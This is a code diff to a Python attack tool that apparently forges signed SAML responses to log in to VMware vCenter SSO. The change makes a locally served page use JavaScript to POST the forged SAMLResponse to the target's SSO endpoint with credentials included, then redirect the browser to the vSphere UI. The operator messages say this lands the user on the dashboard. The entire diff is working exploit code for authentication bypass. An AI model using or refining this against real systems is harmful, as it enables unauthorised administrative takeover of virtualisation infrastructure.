@@ -2037,25 +2037,36 @@ def main():
                                                      key_pem, cert1_pem, cert2_pem, authn_id)
 
         if choice == '1':
-            import socket, threading
+            import json, socket, threading
             from http.server import HTTPServer, BaseHTTPRequestHandler
 
             saml_b64 = base64.b64encode(signed).decode()
-            html_bytes = (
-                '<!DOCTYPE html><html>\n'
-                f'<body onload="document.forms[0].submit()">\n'
-                f'<form method="POST" action="https://{target}/ui/saml/websso/sso">\n'
-                f'  <input type="hidden" name="SAMLResponse" value="{saml_b64}"/>\n'
-                f'  <input type="hidden" name="RelayState" value="{relay_state}"/>\n'
-                '</form>\n'
-                '<p>Submitting SSO login...</p>\n'
-                '</body></html>'
-            ).encode()
+            sso_url  = f'https://{target}/ui/saml/websso/sso'
+            ui_url   = f'https://{target}/ui/'
+            html_bytes = '\n'.join([
+                '<!DOCTYPE html><html><head><title>vCenter SSO</title></head><body>',
+                '<p>Logging in to vCenter&#8230;</p>',
+                '<script>',
+                '(async function() {',
+                '  const p = new URLSearchParams();',
+                f'  p.append("SAMLResponse", {json.dumps(saml_b64)});',
+                f'  p.append("RelayState", {json.dumps(relay_state)});',
+                f'  await fetch({json.dumps(sso_url)}, {{',
+                '    method: "POST", mode: "no-cors", credentials: "include",',
+                '    headers: {"Content-Type": "application/x-www-form-urlencoded"},',
+                '    body: p.toString()',
+                '  }}).catch(function(){});',
+                f'  window.location.replace({json.dumps(ui_url)});',
+                '})();',
+                '</script>',
+                '</body></html>',
+                '',
+            ]).encode()
 
             class _Handler(BaseHTTPRequestHandler):
                 def do_GET(self):
                     self.send_response(200)
-                    self.send_header('Content-Type', 'text/html')
+                    self.send_header('Content-Type', 'text/html; charset=utf-8')
                     self.send_header('Content-Length', str(len(html_bytes)))
                     self.end_headers()
                     self.wfile.write(html_bytes)
@@ -2074,9 +2085,8 @@ def main():
 
             print(f'\n[+] SAML login page ready — open in any browser on this network:')
             print(f'    http://{local_ip}:{port}/')
-            print(f'\n    When the page goes blank, navigate to:')
+            print(f'\n    The page will submit the SAML token and redirect you to:')
             print(f'    https://{target}/ui/')
-            print(f'    (cookies are already set — you will land on the vSphere dashboard)')
             print(f'\n    Ctrl-C to stop the server.')
             try:
                 srv.serve_forever()
